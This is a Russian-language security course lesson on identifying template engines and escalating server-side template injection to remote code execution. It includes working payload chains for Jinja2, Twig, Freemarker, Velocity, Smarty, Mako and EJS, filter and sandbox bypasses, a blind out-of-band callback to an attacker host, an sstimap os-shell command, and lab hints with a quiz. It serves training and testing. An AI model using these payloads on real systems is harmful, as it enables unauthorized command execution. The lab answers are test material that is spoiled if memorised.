---
id: web-ssti-engines
title: "SSTI по движкам: Jinja2, Twig, Freemarker, Velocity, Handlebars"
category: web
parent: web-ssti-advanced
difficulty: hard
order: 3
tags: [ssti, jinja2, twig, freemarker, velocity, sandbox]
prerequisites: [web-ssti]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 50
summary: "Определение шаблонизатора и per-engine sandbox escape до RCE: Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, EJS, Pebble, Handlebars."
lab:
  kind: shell
  title: 'Практика: определи движок и получи RCE'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Полиглот `{{7*7}}` → `49`, а `${7*7}` не вычисляется: движок использует `{{ }}`.'
    - 'Различи движок умножением строки: `{{7*''7''}}` → `7777777` означает Python (Jinja2).'
    - 'У Jinja2 путь к RCE: `{{lipsum.__globals__[''os''].popen(''id'').read()}}`.'
    - 'Флаг: выполни `cat /flag` тем же `popen`.'
---

## Вопрос, с которого всё начинается

На уроке про SSTI мы выяснили, что серверный шаблонизатор может выполнять наш текст. Но дальше начинается тонкость: **у каждого движка свой синтаксис, свои объекты и свой путь к RCE**. Payload для Jinja2 ничего не сделает в Twig или Freemarker.

Вопрос: как за один проход понять, какой движок перед тобой, и построить цепочку под него? Разберём это на одном примере.

## Наш пример

Есть сервис уведомлений `notify.example` с эндпоинтом, который подставляет имя в шаблон. Отправим разные «полиглоты» — строки, которые ведут себя по-разному в разных движках, — и посмотрим, что вычислится:

```bash
$ curl -s 'https://notify.example/render?name={{7*7}}'
Здравствуйте, 49!
$ curl -s 'https://notify.example/render?name=${7*7}'
Здравствуйте, ${7*7}!
```

`{{7*7}}` → `49`, а `${7*7}` — нет. Значит, движок использует синтаксис `{{ }}`. Это семейство Python/JS (Jinja2, Twig, Nunjucks, Handlebars). Сузим дальше.

## Шаг 1: различаем движки внутри семейства

Классический трюк — умножение **строки** на число. В Python (Jinja2) строка повторяется, в PHP (Twig) приводится к числу:

```bash
$ curl -s "https://notify.example/render?name={{7*'7'}}"
Здравствуйте, 7777777!
```

`7777777` — это **Jinja2** (Python). Twig вернул бы `49`. Теперь мы знаем движок и можем строить цепочку.

## Шаг 2: RCE для Jinja2

В Python любой объект знает свой класс. Идём от строки к модулю `os`:

```bash
$ curl -s "https://notify.example/render?name={{lipsum.__globals__['os'].popen('id').read()}}"
Здравствуйте, uid=1000(app) gid=1000(app)!
```

`lipsum` — глобальный объект Jinja2, у него есть `__globals__` (глобальные переменные модуля), где лежит `os`. Если `lipsum` недоступен:

```bash
$ curl -s "https://notify.example/render?name={{cycler.__init__.__globals__.os.popen('id').read()}}"
```

Ещё один путь — через список подклассов:

```bash
$ curl -s "https://notify.example/render?name={{''.__class__.__mro__[1].__subclasses__()}}" \
  | tr ',' '\n' | grep -n 'subprocess.Popen'
414: <class 'subprocess.Popen'>
```

`__mro__` — цепочка наследования классов, `__subclasses__()` перечисляет потомков `object`, среди которых есть `subprocess.Popen`. Индекс 414 подставляется в вызов. Все три пути ведут к одному: выполнению команды.

## Шаг 3: другие движки — своя цепочка

Держи таблицу путей к RCE по движкам:

| Движок | Признак | Путь к RCE |
|--------|---------|------------|
| Jinja2 (Python) | `{{7*'7'}}` → `7777777` | `lipsum.__globals__.os.popen('id').read()` |
| Twig (PHP) | `{{7*'7'}}` → `49` | `{{['id']\|filter('system')}}` |
| Freemarker (Java) | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `${7*7}` → `49` | `#set($rt=$x.class.forName('java.lang.Runtime'))...exec('id')` |
| Smarty (PHP) | `{7*7}` → `49` | `{system('id')}` |
| Mako (Python) | `${7*7}` → `49` | `${self.module.cache.util.os.popen('id').read()}` |
| EJS (Node) | `<%= 7*7 %>` → `49` | `<%= process.mainModule.require('child_process').execSync('id') %>` |

Проверим Freemarker на нашем сервисе, чтобы убедиться, что это не Java:

```bash
$ curl -s 'https://notify.example/render?name=${7*7}'
Здравствуйте, ${7*7}!
```

Не вычислилось — не Java-движок. Совпадает с выводом шага 1.

## Шаг 4: полный детект за один проход

Отправляем пачку проб и смотрим, что вернулось:

```bash
$ for p in '{{7*7}}' '{{7*"7"}}' '${7*7}' '#{7*7}' '{7*7}' '<%= 7*7 %>' '${{7*7}}'; do
>   r=$(curl -s -G 'https://notify.example/render' --data-urlencode "name=$p")
>   echo "$p => $(echo "$r" | grep -oE '49|7777777' | head -1)"
> done
{{7*7}} => 49
{{7*"7"}} => 7777777
${7*7} => 
#{7*7} => 
{7*7} => 
<%= 7*7 %> => 
${{7*7}} => 
```

Такой проход за один раз показывает и синтаксис, и (по `7*'7'`) язык.

## Шаг 5: обход фильтров и sandbox

Часто опасные символы вырезают. Обходы:

| Что заблокировано | Обход |
|-------------------|-------|
| `{{` | `{%`, `{#`, `${`, `#{}` |
| `.` | `['__class__']`, `\|attr('__class__')` |
| `_` | `request.args.x`, `\|attr(request.args.a)` |
| ключевые слова | конкатенация строк, `\x5f` |
| `os` | `__import__('os')`, `subprocess` |

Например, без точек:

```bash
$ curl -s "https://notify.example/render?name={{ (lipsum|attr('__globals__')).os.popen('id').read() }}"
```

`|attr('__globals__')` берёт атрибут по строке, не используя точку. В Flask-sandbox часто остаются доступны `cycler`, `lipsum`, `request` — через них и обходят.

## Шаг 6: слепой SSTI

Если ответ не отражается, используют время или внешние запросы. Признак blind-SSTI — задержка ответа или приход callback:

```text
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('time').sleep(5) }}
```

Если ответ задержался на 5 секунд — код исполнился. OOB-вариант — заставить сервер постучаться к тебе (`curl http://attacker/`).

## Шаг 7: инструменты

```bash
$ python3 sstimap.py -u 'https://notify.example/render?name=*' --os-shell
$ nuclei -u https://notify.example -tags ssti -j
```

`sstimap`/`tplmap` автоматизируют определение и эксплуатацию, но проверяй их вывод руками. `nuclei` находит известные шаблоны, но не заменяет ручной детект.

## Шаг 8: движок по ошибкам и исходникам

Математика определяет движок, но иногда помогают **сообщения об ошибке** и исходники. Отправь заведомо сломанный шаблон — движок часто подсказывает себя в тексте исключения:

```bash
$ curl -s "https://notify.example/render?name={{7*7"      # незакрытая скобка
jinja2.exceptions.TemplateSyntaxError: unexpected end of template
```

Строка `jinja2.exceptions` прямо называет движок. Аналогично `Twig\Error\SyntaxError` (PHP), `freemarker.core.ParseException` (Java), `Nunjucks` (Node). Если приложение отдаёт стек-трейс — ты экономишь несколько запросов. Если есть доступ к исходникам (`.git`, `composer.json`, `requirements.txt`, `package.json`), посмотри, какой шаблонизатор реально подключён: это снимает все сомнения. Например, `requirements.txt` с `jinja2==2.11.2` сразу указывает и на движок, и на потенциально уязвимую версию.

## Шаг 9: где вообще проверять SSTI

SSTI живёт не только в «имени на странице». Проверяй все поля, которые попадают в **генерацию текста**: шаблоны писем, PDF-отчёты, уведомления, темы сообщений, заголовки, имена файлов в экспорте. Их часто собирают из введённых значений, и они реже покрыты санитизацией, чем основная страница. Начни с математического детекта по всем синтаксисам сразу (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`) — это дешёвая проверка, которая либо сразу покажет движок, либо отсечёт вектор. Если ответ не отражается, переходи к time-based и OOB.

## Что мы теперь знаем

- Движок определяют «полиглотами»: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
- `{{7*'7'}}` → `7777777` = Jinja2, `49` = Twig.
- У каждого движка своя цепочка к RCE; универсального payload нет.
- Jinja2: `lipsum.__globals__`, `cycler`, `subclasses()` → `Popen`.
- Фильтры обходят `|attr`, `request.args`, конкатенацией.
- Blind SSTI доказывают time-based или OOB.
- Артефакт — вывод `id`, а не «выражение посчиталось».

## На что смотреть дальше

- **Сначала движок, потом цепочка** — не трать запросы на payload не для того движка.
- **`{{7*'7'}}` — самый быстрый различитель** Jinja2/Twig.
- **Sandbox есть — не сдавайся:** обходи через разрешённые объекты (`cycler`, `lipsum`, `request`).
- **Проверь версию** — часть payload'ов только для старых версий (например, Twig `_self`).
- **Blind — норма:** используй time-based и OOB.
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: "Какой движок даёт `{{7*'7'}}` = `7777777`?"
  options:
    - "Twig"
    - "Jinja2"
    - "Freemarker"
    - "Smarty"
  answer: 1
  explanation: "Jinja2 (Python) повторяет строку при умножении на число."
- question: "Какой payload характерен для Freemarker?"
  options:
    - "`{{7*7}}`"
    - "`${7*7}` и `?new()`"
    - "`<%= 7*7 %>`"
    - "`{7*7}`"
  answer: 1
  explanation: "Java-движок Freemarker использует `${}` и оператор `?new()`."
- question: "Что делает `?new()` в Freemarker?"
  options:
    - "Создаёт объект класса (например, `Execute`) — примитив RCE"
    - "Шифрует вывод"
    - "Кеширует шаблон"
    - "Логирует запрос"
  answer: 0
  explanation: "Инстанцирует класс, что и даёт путь к выполнению команды."
- question: "Как обойти Jinja2-фильтр, вырезающий точку?"
  options:
    - "Никак"
    - "Через `|attr('__globals__')` — обращение к атрибуту по строке"
    - "Через SQL"
    - "Через cookie"
  answer: 1
  explanation: "Фильтр attr берёт атрибут по строке, не используя точку."
- question: "Ответ не отражает вывод. Как подтвердить blind-SSTI?"
  options:
    - "Никак"
    - "Time-based (sleep) или OOB-запросом к своему listener"
    - "Сменить браузер"
    - "Добавить cookie"
  answer: 1
  explanation: "Задержка ответа или приход callback доказывают выполнение."
```

## Куда дальше

Дальше мы вернёмся к загрузке файлов, но уже на продвинутом уровне — обходам проверок и связкам с другими уязвимостями (`web-file-upload-advanced`). А пока главное запомни: SSTI — это **движок + цепочка**, и первый шаг всегда один — определить движок.

## Где пригодится

- **CTF (Web):** SSTI-задачи на конкретные движки.
- **Bug bounty:** SSTI → RCE — критичный отчёт.
- **Пентест:** аудит шаблонизаторов (email/PDF/отчёты).
- **Работа (AppSec):** sandbox, отсутствие пользовательских шаблонов, обновление движков.
